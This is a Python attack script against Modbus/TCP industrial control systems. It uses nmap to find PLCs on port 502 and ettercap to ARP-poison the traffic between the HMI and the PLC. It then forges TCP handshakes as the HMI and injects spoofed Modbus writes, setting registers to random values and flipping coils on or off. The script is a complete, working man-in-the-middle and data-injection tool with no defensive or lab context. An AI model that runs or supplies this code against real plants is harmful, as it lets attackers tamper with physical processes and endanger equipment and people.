from time import *
from scapy.all import *
from random import *
import os, nmap, threading

plc_ip = ''
hmi_ip = ''
plc_mac = ''
hmi_mac = ''
frame1 = ''
sport = ''
seq_frame2 = ''
ack_frame2 = ''

# Modbus ADU
class ModbusTCP(Packet):
    name = "Modbus/TCP"
    fields_desc = [ ShortField("trans_id", 233),
                    ShortField("proto_id", 0),
                    ShortField("Length", 9),
                    XByteField("uid", 1),
                    ]

# Modbus PDU
class Modbus(Packet):
    name = "Modbus"
    fields_desc = [ XByteField("func_code", 16),
                    ShortField("ref_num", 233),
                    ShortField("Word_Count", 1),
                    XByteField("Byte_Count", 2),
                    ShortField("reg_val", 233),
                    ]

class Modbus0(Packet):
    name = "Modbus"
    fields_desc = [ XByteField("func_code", 5),
                    ShortField("ref_num", 2),
                    ShortField("data", 0x0000),
                    ]
class Modbus1(Packet):
    name = "Modbus"
    fields_desc = [ XByteField("func_code", 5),
                    ShortField("ref_num", 2),
                    ShortField("data", 0xff00),
                    ]

def changeData_reg(addr, val):
    handshake()
    mb_reg = Ether(src=hmi_mac, dst=plc_mac)/\
       IP(src=hmi_ip, dst=plc_ip)/\
       TCP(sport=sport, dport=502, seq=seq_frame2, ack=ack_frame2, flags='PA')/\
       ModbusTCP()/\
       Modbus()
    mb_reg[ModbusTCP].Length = 9
    mb_reg[Modbus].ref_num = addr
    mb_reg[Modbus].reg_val = val
    sendp(mb_reg)

def changeData0(addr):
    handshake()
    mb_0 = Ether(src=hmi_mac, dst=plc_mac)/\
       IP(src=hmi_ip, dst=plc_ip)/\
       TCP(sport=sport, dport=502, seq=seq_frame2, ack=ack_frame2, flags='PA')/\
       ModbusTCP()/\
       Modbus0()
    mb_0[ModbusTCP].Length = 6
    mb_0[Modbus0].ref_num = addr
    sendp(mb_0)

def changeData1(addr):
    handshake()
    mb_1 = Ether(src=hmi_mac, dst=plc_mac)/\
       IP(src=hmi_ip, dst=plc_ip)/\
       TCP(sport=sport, dport=502, seq=seq_frame2, ack=ack_frame2, flags='PA')/\
       ModbusTCP()/\
       Modbus1()
    mb_1[ModbusTCP].Length = 6
    mb_1[Modbus1].ref_num = addr
    sendp(mb_1)

#nmap scan plc ip
def plc_scan():
        nm = nmap.PortScanner()
        net = input("enter your network : ")
        nm.scan(hosts=net, arguments='-n -p502 --script modbus-discover.nse')
        hosts_list = [(x, nm[x]['tcp'][502]['state']) for x in nm.all_hosts()]
        for host, state in hosts_list:
            if state == 'open':
                global plc_ip
                plc_ip = host
                print("PLC IP : {}".format(plc_ip))

#sniff data between plc and hmi to get hmi_mac, plc_mac, hmi_ip
def hmi_scan(plcip):
        fil = "dst host {} and dst port 502 and tcp[13] = 0x18".format(plcip)
        p = sniff(iface="eth0", count=1, filter=fil)
        x = p[0]
        global hmi_ip, plc_mac, hmi_mac
        hmi_ip = x[IP].src
        hmi_mac = x[Ether].src
        plc_mac = x[Ether].dst
        print("HMI IP : {}".format(hmi_ip))


def get_ipmac():
        plc_scan()
        arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(plc_ip)
        os.system(arp1)
        hmi_scan(plc_ip)
        os.system('pkill -f ettercap')
        sleep(1)

#capture tcp SA frame
def cap():
        filx = "host {} and tcp[13] = 0x12".format(plc_ip)
        pframe1 = sniff(iface="eth0", timeout=0.5, count=1, filter=filx)
        global frame1
        frame1 = pframe1[0]

#establish a tcp connection via forging a fake 3-way handshake
def handshake():
    #layer 4 
    global sport
    sport = randrange(52000, 52800)
    seq_frame0 = randint(1, 4294967295)
    ack_frame0 = int('0', 16)
    tcp_syn = Ether(src=hmi_mac, dst=plc_mac)/\
          IP(src=hmi_ip, dst=plc_ip)/\
          TCP(sport=sport, dport=502, seq=seq_frame0, ack=ack_frame0, flags='S')
    thread1 = threading.Thread(target=cap)
    thread1.start()
    time.sleep(0.01)
    sendp(tcp_syn)
    thread1.join()
    global seq_frame2, ack_frame2
    seq_frame2 = frame1[TCP].ack
    ack_frame2 = frame1[TCP].seq + 1
    tcp_ack = Ether(src=hmi_mac, dst=plc_mac)/\
       IP(src=hmi_ip, dst=plc_ip)/\
       TCP(sport=sport, dport=502, seq=seq_frame2, ack=ack_frame2, flags='A')
    sendp(tcp_ack)


def arp_spoofing():
        arp2 = 'nohup ettercap -Tq -i eth0 -M ARP:oneway /{hmi}// /{plc}// >/dev/null 2>&1 &'.format(hmi=hmi_ip, plc=plc_ip)
        os.system(arp2)
        process = os.popen('pgrep -f ettercap')
        out = process.read()
        process.close()
        print("ettercap is running, PID : {}".format(out))
        print("ARP Poisoning start !!")
        sleep(4)

def data_injection():
        while True:
                xx = 1
                while xx:
                        pp = "dst host {} and tcp[13] = 0x18".format(plc_ip)
                        plc_frames = sniff(iface="eth0", count=1, filter=pp)
                        modbus_query = plc_frames[0]
                        st = str(modbus_query[Raw].load)
                        try:
                                if "\\x01\\x10\\x00" in st:
                                        ref = randrange(100, 110)
                                        value = randrange(1, 1000)
                                        changeData_reg(ref, value)
                                        xx = 0
                                        print("\033[1;36m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
                                elif st[-9: -1] == "\\xff\\x00":
                                        ref2 = randrange(40, 50)
                                        changeData0(ref2)
                                        xx = 0
                                        print("\033[1;35m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
                                elif st[-9: -1] == "\\x00\\x00":
                                        ref3 = randrange(40, 50)
                                        changeData1(ref3)
                                        xx = 0
                                        print("\033[1;33m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
                        except:
                                xx = 1

def main():
        get_ipmac()
        arp_spoofing()
        data_injection()

try:
    main()
except KeyboardInterrupt:
    exit()

